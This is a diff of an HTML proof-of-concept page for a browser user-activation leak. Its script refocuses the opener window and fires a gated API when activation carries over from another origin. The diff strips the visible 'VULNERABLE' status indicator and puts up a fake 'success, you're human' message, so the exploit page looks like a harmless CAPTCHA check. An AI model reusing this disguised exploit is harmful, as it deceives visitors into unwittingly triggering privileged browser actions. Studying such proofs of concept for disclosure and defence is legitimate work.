@@ -1,29 +1,24 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <title>PoC - Target Page (Vulnerable Origin)</title>
 </head>
-<body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
-    <h1>Target Page (Target Origin)</h1>
-    <p>User Activation Status: <b id="act-status">Checking...</b></p>
 
+<body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
+    <h1>success, you're human</h1>
     <script>
         if (window.opener) {
             setTimeout(() => {
                 window.opener.focus();
-            }, 500); 
+            }, 500);
         }
 
         let triggered = false;
 
         function checkAndExploit(triggerSource) {
             const isActive = navigator.userActivation.isActive;
-            const statusElement = document.getElementById('act-status');
-
-            statusElement.innerText = isActive ? "VULNERABLE (LEAKED!)" : "INACTIVE (NORMAL)";
-            statusElement.style.color = isActive ? "red" : "green";
-
             console.log(`[${triggerSource}] Activation state:`, isActive);
 
             if (isActive && !triggered) {
@@ -36,7 +31,7 @@
                     })
                     .catch(e => {
                         console.log("API blocked/dismissed:", e.message);
-                        triggered = false; 
+                        triggered = false;
                     });
             }
         }
@@ -45,4 +40,5 @@
         window.addEventListener("pageshow", () => checkAndExploit("pageshow"));
     </script>
 </body>
+
 </html>
